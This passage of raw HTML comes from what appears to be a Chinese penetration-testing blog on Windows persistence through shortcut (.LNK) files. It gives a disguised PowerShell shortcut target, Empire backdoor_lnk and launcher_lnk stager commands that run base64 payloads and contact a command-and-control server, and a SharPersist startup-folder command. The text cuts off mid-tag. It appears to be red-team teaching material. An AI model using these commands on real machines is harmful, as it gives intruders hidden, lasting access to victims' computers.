    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>自启动容易被发现，所以用户在打开正常应用的时候允许同时打开2个应用（包含正常应用）稍微隐蔽一点。</p>
<p>这里需要用到<code>powershell</code>进行辅助</p>
<p>修改目标值为：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">powershell</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">-c</span> <span style="color:#a6be9d">&#34;invoke-item &#39;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&#39;; invoke-item c:\windows\system32\calc.exe&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714113433194.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113433194.png" alt="image-20210714113433194" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113433194.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113433194.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113433194.png?size=large 2x" data-title="image-20210714113433194" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>此时点击快捷方式就可以同时启动两个应用了，缺点就是启动的时候会有一个CMD黑框</p>
<p>解决方案：属性中的运行方式选择<strong>最小化</strong></p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714113628636.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113628636.png" alt="image-20210714113628636" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113628636.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113628636.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113628636.png?size=large 2x" data-title="image-20210714113628636" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>此方案不足的点，就是鼠标指向图标时，会显示powershell路径</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/image-20210714113808329.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113808329.png" alt="image-20210714113808329" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113808329.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113808329.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/image-20210714113808329.png?size=large 2x" data-title="image-20210714113808329" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h2 id="一些辅助工具" class="heading-element"><span>一些辅助工具</span>
  <a href="#%e4%b8%80%e4%ba%9b%e8%be%85%e5%8a%a9%e5%b7%a5%e5%85%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h4 id="empire-1" class="heading-element"><span>Empire</span>
  <a href="#empire-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>Empire包含一个持久性模块，该模块可以后门合法的快捷方式（.LNK），以执行任意的PowerShellpayload。现有快捷方式的目标字段将被修改以执行存储在注册表项中的base64脚本。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">usemodule</span> <span style="color:#58a1dd">persistence</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">userland</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">backdoor_lnk</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103131337-2058768825.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103131337-2058768825.png" alt="Empire–后门现有快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103131337-2058768825.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103131337-2058768825.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103131337-2058768825.png?size=large 2x" data-title="Empire–后门现有快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>查看快捷方式的属性将显示目标字段已成功修改以执行PowerShellpayload。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103158377-1494098900.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103158377-1494098900.png" alt="Empire-修改后的快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103158377-1494098900.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103158377-1494098900.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103158377-1494098900.png?size=large 2x" data-title="Empire-修改后的快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>由于快捷方式存在于启动文件夹中，因此暂存器将在下一次Windows登录中执行，并且将与命令和控制服务器建立连接。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103234521-1980646915.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103234521-1980646915.png" alt=" Empire-通过快捷方式成功上线" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103234521-1980646915.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103234521-1980646915.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103234521-1980646915.png?size=large 2x" data-title=" Empire-通过快捷方式成功上线" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>但是，Empire包含一个可用于生成具有LNK文件格式的暂存器的模块。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">usestager</span> <span style="color:#58a1dd">windows</span><span style="color:#ff636f">/</span><span style="color:#58a1dd">launcher_lnk</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">set</span> <span style="color:#58a1dd">Listener</span> <span style="color:#58a1dd">http</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">execute</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103304964-1116312506.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103304964-1116312506.png" alt=" Empire-创建快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103304964-1116312506.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103304964-1116312506.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103304964-1116312506.png?size=large 2x" data-title=" Empire-创建快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>默认情况下，此模块将使用写字板图标伪装成可信任的应用程序。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103333103-972955603.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103333103-972955603.png" alt=" Empire-写字板快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103333103-972955603.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103333103-972955603.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103333103-972955603.png?size=large 2x" data-title=" Empire-写字板快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>快捷方式的目标字段将使用执行Base64payload的PowerShell命令填充。可以将快捷方式转移并移动到启动文件夹中以保持持久性。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103410255-1737326702.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103410255-1737326702.png" alt="Empire-快捷属性" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103410255-1737326702.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103410255-1737326702.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103410255-1737326702.png?size=large 2x" data-title="Empire-快捷属性" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="sharpersist-2" class="heading-element"><span>SharPersist</span>
  <a href="#sharpersist-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><a href="https://github.com/fireeye/SharPersist"target="_blank" rel="external nofollow noopener noreferrer">SharPersist</a>能够创建Internet Explorer快捷方式，该快捷方式将执行任意payload并将其放置在启动文件夹中以实现持久性。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">SharPersist</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">t</span> <span style="color:#58a1dd">startupfolder</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">c</span> <span style="color:#a6be9d">&#34;cmd.exe&#34;</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">a</span> <span style="color:#a6be9d">&#34;/c C:</span><span style="color:#a6be9d">\t</span><span style="color:#a6be9d">emp\pentestlab.exe&#34;</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">f</span> <span style="color:#a6be9d">&#34;pentestlab&#34;</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">m</span> <span style="color:#58a1dd">add</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103457702-2132720686.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103457702-2132720686.png" alt=" SharPersist –快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103457702-2132720686.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103457702-2132720686.png?size=medium 1.5x, 